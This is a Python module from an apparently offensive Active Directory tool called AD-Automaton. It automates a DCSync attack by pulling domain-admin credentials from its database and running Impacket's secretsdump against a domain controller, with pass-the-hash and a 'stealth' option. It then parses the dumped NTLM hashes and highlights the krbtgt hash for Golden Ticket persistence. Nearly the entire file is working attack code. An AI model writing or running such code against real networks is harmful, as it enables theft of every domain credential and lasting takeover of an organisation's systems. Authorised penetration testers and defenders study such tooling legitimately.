#!/usr/bin/env python3
"""
DCSync Module for AD-Automaton
Performs DCSync attacks using Impacket's secretsdump.py to extract domain credentials.
"""

import os
import re
import logging
import tempfile
from typing import List, Dict, Any, Optional, Tuple

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lib'))

from database import DatabaseManager, Credential, Host
from executor import CommandExecutor
from parsers import ImpacketParser
from logger import log_discovery, log_tool_execution, log_tool_result

class DCSyncAttacker:
    """
    Handles DCSync attacks using Impacket's secretsdump.py.
    Extracts all domain user credentials including the krbtgt account.
    """
    
    def __init__(self, db_manager: DatabaseManager, config: Dict[str, Any]):
        """
        Initialize the DCSync attacker.
        
        Args:
            db_manager: Database manager instance
            config: Configuration dictionary
        """
        self.db_manager = db_manager
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.executor = CommandExecutor()
        self.parser = ImpacketParser()
        
        # Get tool configurations
        self.impacket_config = config.get('tools', {}).get('impacket', {})
        self.secretsdump_path = self.impacket_config.get('secretsdump_path', 'impacket-secretsdump')
        
        # Feature flags
        self.enabled = config.get('features', {}).get('enable_dcsync', True)
        
        # OPSEC settings
        self.opsec_profile = config.get('opsec_profile', 'normal')
        
        # Output directory for dumps
        self.output_dir = config.get('output', {}).get('dcsync_dir', '/tmp/ad-automaton-dcsync')
        os.makedirs(self.output_dir, exist_ok=True)
    
    def run_dcsync_attack(self) -> List[Credential]:
        """
        Main method to run DCSync attacks.
        
        Returns:
            List of extracted domain credentials
        """
        if not self.enabled:
            self.logger.info("DCSync attacks are disabled in configuration")
            return []
        
        self.logger.info("Starting DCSync attack")
        
        # Check for domain admin credentials
        domain_admin_credentials = self._get_domain_admin_credentials()
        
        if not domain_admin_credentials:
            self.logger.warning("No domain admin credentials found for DCSync attack")
            return []
        
        extracted_credentials = []
        
        # Try DCSync with each domain admin credential
        for credential in domain_admin_credentials:
            try:
                self.logger.info(f"Attempting DCSync with credential: {credential.username}")
                
                # Perform DCSync attack
                creds = self._perform_dcsync(credential)
                extracted_credentials.extend(creds)
                
                if creds:
                    self.logger.info(f"DCSync successful with {credential.username}, extracted {len(creds)} credentials")
                    break  # Success, no need to try other credentials
                    
            except Exception as e:
                self.logger.error(f"DCSync failed with credential {credential.username}: {e}")
                continue
        
        # Store extracted credentials
        if extracted_credentials:
            self._store_credentials(extracted_credentials)
            self._mark_krbtgt_hash(extracted_credentials)
        
        log_discovery("DCSync credentials", len(extracted_credentials))
        
        return extracted_credentials
    
    def _get_domain_admin_credentials(self) -> List[Credential]:
        """Get domain administrator credentials from the database."""
        # First try to get credentials explicitly marked as admin
        query = """
            SELECT DISTINCT c.* FROM Credentials c
            JOIN Valid_Credentials vc ON c.cred_id = vc.cred_id
            WHERE vc.access_level = 'ADMIN' AND c.domain IS NOT NULL
        """
        
        credentials = []
        rows = self.db_manager.execute_query(query)
        
        for row in rows:
            credential = Credential(
                cred_id=row[0],
                username=row[1],
                domain=row[2],
                password=row[3],
                hash_value=row[4],
                hash_type=row[5],
                source_tool=row[6]
            )
            credentials.append(credential)
        
        # If no admin credentials found, try to get credentials for known DA users
        if not credentials:
            self.logger.info("No explicit admin credentials found, checking for Domain Admin user credentials")
            
            da_query = """
                SELECT DISTINCT c.* FROM Credentials c
                JOIN Users u ON c.username = u.username AND c.domain = u.domain
                WHERE u.is_admin = 1 OR u.username IN (
                    SELECT DISTINCT u2.username FROM Users u2
                    JOIN Group_Memberships gm ON u2.user_id = gm.user_id
                    JOIN Groups g ON gm.group_id = g.group_id
                    WHERE g.group_name LIKE '%Domain Admins%' OR g.group_name LIKE '%Enterprise Admins%'
                )
            """
            
            rows = self.db_manager.execute_query(da_query)
            
            for row in rows:
                credential = Credential(
                    cred_id=row[0],
                    username=row[1],
                    domain=row[2],
                    password=row[3],
                    hash_value=row[4],
                    hash_type=row[5],
                    source_tool=row[6]
                )
                credentials.append(credential)
        
        return credentials
    
    def _perform_dcsync(self, credential: Credential) -> List[Credential]:
        """
        Perform DCSync attack using secretsdump.py.
        
        Args:
            credential: Domain admin credential to use
            
        Returns:
            List of extracted credentials
        """
        # Get domain controllers to target
        domain_controllers = self._get_domain_controllers()
        
        if not domain_controllers:
            self.logger.warning("No domain controllers found for DCSync attack")
            return []
        
        # Target the first available DC
        target_dc = domain_controllers[0]
        
        # Construct secretsdump command
        cmd_parts = [self.secretsdump_path]
        
        # Add authentication
        if credential.password:
            cmd_parts.extend([f"{credential.domain}/{credential.username}:{credential.password}@{target_dc.ip_address}"])
        elif credential.hash_value:
            # Use pass-the-hash
            cmd_parts.extend([
                '-hashes', f':{credential.hash_value}',
                f"{credential.domain}/{credential.username}@{target_dc.ip_address}"
            ])
        else:
            self.logger.error("No usable authentication method for DCSync")
            return []
        
        # Add output options
        output_prefix = os.path.join(self.output_dir, f"dcsync_{credential.username}_{target_dc.ip_address}")
        cmd_parts.extend(['-outputfile', output_prefix])
        
        # Add DCSync-specific options
        cmd_parts.extend(['-just-dc'])  # Only dump domain controller secrets
        
        # OPSEC considerations
        if self.opsec_profile == 'stealth':
            cmd_parts.extend(['-just-dc-user', 'krbtgt'])  # Only dump krbtgt if stealth
        
        cmd = ' '.join(cmd_parts)
        
        try:
            log_tool_execution("secretsdump DCSync", cmd)
            result = self.executor.execute_command(cmd, timeout=600)  # 10 minute timeout
            log_tool_result("secretsdump DCSync", result.returncode == 0)
            
            if result.returncode == 0:
                # Parse the output files
                credentials = self._parse_secretsdump_output(output_prefix, credential.domain)
                self.logger.info(f"DCSync successful, extracted {len(credentials)} credentials")
                return credentials
            else:
                self.logger.error(f"DCSync failed: {result.stderr}")
                return []
                
        except Exception as e:
            self.logger.error(f"Error running DCSync: {e}")
            return []
    
    def _parse_secretsdump_output(self, output_prefix: str, domain: str) -> List[Credential]:
        """
        Parse secretsdump output files to extract credentials.
        
        Args:
            output_prefix: Prefix for output files
            domain: Domain name
            
        Returns:
            List of extracted credentials
        """
        credentials = []
        
        # secretsdump creates multiple output files
        output_files = [
            f"{output_prefix}.ntds",
            f"{output_prefix}.secrets",
            f"{output_prefix}.sam"
        ]
        
        for output_file in output_files:
            if os.path.exists(output_file):
                try:
                    credentials.extend(self._parse_ntds_file(output_file, domain))
                except Exception as e:
                    self.logger.error(f"Error parsing {output_file}: {e}")
        
        # Also check if there's direct stdout output to parse
        return credentials
    
    def _parse_ntds_file(self, ntds_file: str, domain: str) -> List[Credential]:
        """
        Parse NTDS.dit dump file to extract user credentials.
        
        Args:
            ntds_file: Path to NTDS dump file
            domain: Domain name
            
        Returns:
            List of extracted credentials
        """
        credentials = []
        
        try:
            with open(ntds_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    
                    # Skip empty lines and headers
                    if not line or line.startswith('[') or 'dumping' in line.lower():
                        continue
                    
                    # Parse NTDS format: domain\username:uid:lm_hash:ntlm_hash:::
                    match = re.match(r'^([^\\]+)\\([^:]+):(\d+):([a-f0-9]{32})?:([a-f0-9]{32})?:::', line, re.IGNORECASE)
                    
                    if match:
                        parsed_domain = match.group(1)
                        username = match.group(2)
                        uid = match.group(3)
                        lm_hash = match.group(4)
                        ntlm_hash = match.group(5)
                        
                        # Skip machine accounts (ending with $) unless it's a DC
                        if username.endswith('$') and not username.lower().startswith('dc'):
                            continue
                        
                        # Skip empty hashes
                        if not ntlm_hash or ntlm_hash == '31d6cfe0d16ae931b73c59d7e0c089c0':
                            continue
                        
                        # Create credential record
                        credential = Credential(
                            username=username,
                            domain=parsed_domain,
                            hash_value=ntlm_hash,
                            hash_type='NTLM',
                            source_tool='secretsdump_dcsync'
                        )
                        
                        credentials.append(credential)
                        
                        # Special logging for krbtgt account
                        if username.lower() == 'krbtgt':
                            self.logger.info(f"🎯 CRITICAL: Extracted krbtgt hash for Golden Ticket attacks!")
                        
                        self.logger.debug(f"Extracted credential for {username}")
        
        except Exception as e:
            self.logger.error(f"Error parsing NTDS file {ntds_file}: {e}")
        
        return credentials
    
    def _mark_krbtgt_hash(self, credentials: List[Credential]) -> None:
        """
        Special handling for krbtgt hash - mark it as critical.
        
        Args:
            credentials: List of extracted credentials
        """
        for cred in credentials:
            if cred.username.lower() == 'krbtgt':
                # Add a special vulnerability record for Golden Ticket capability
                try:
                    # Get a domain controller to associate with
                    dcs = self._get_domain_controllers()
                    if dcs:
                        from database import Vulnerability
                        
                        golden_ticket_vuln = Vulnerability(
                            host_id=dcs[0].host_id,
                            vuln_name="Golden Ticket Capability",
                            description=f"krbtgt account hash extracted - enables Golden Ticket attacks for indefinite domain persistence",
                            source_tool="secretsdump_dcsync"
                        )
                        
                        self.db_manager.add_vulnerability(golden_ticket_vuln)
                        self.logger.info("Added Golden Ticket capability vulnerability record")
                
                except Exception as e:
                    self.logger.error(f"Error marking krbtgt hash: {e}")
    
    def _get_domain_controllers(self) -> List[Host]:
        """Get domain controllers from the database."""
        query = "SELECT * FROM Hosts WHERE is_dc = 1"
        rows = self.db_manager.execute_query(query)
        
        hosts = []
        for row in rows:
            host = Host(
                host_id=row[0],
                ip_address=row[1],
                hostname=row[2],
                os=row[3],
                is_dc=bool(row[4]),
                smb_signing=row[5]
            )
            hosts.append(host)
        
        return hosts
    
    def _store_credentials(self, credentials: List[Credential]) -> None:
        """Store extracted credentials in the database."""
        for cred in credentials:
            try:
                # Check if credential already exists to avoid duplicates
                existing_query = """
                    SELECT cred_id FROM Credentials 
                    WHERE username = ? AND domain = ? AND hash_value = ?
                """
                existing = self.db_manager.execute_query(existing_query, (cred.username, cred.domain, cred.hash_value))
                
                if not existing:
                    self.db_manager.add_credential(cred)
                    self.logger.debug(f"Stored credential for {cred.username}")
                else:
                    self.logger.debug(f"Credential for {cred.username} already exists, skipping")
                    
            except Exception as e:
                self.logger.error(f"Error storing credential for {cred.username}: {e}")


def run_dcsync_attack(db_manager: DatabaseManager, config: Dict[str, Any]) -> List[Credential]:
    """
    Main entry point for DCSync attack module.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        
    Returns:
        List of extracted domain credentials
    """
    attacker = DCSyncAttacker(db_manager, config)
    return attacker.run_dcsync_attack() 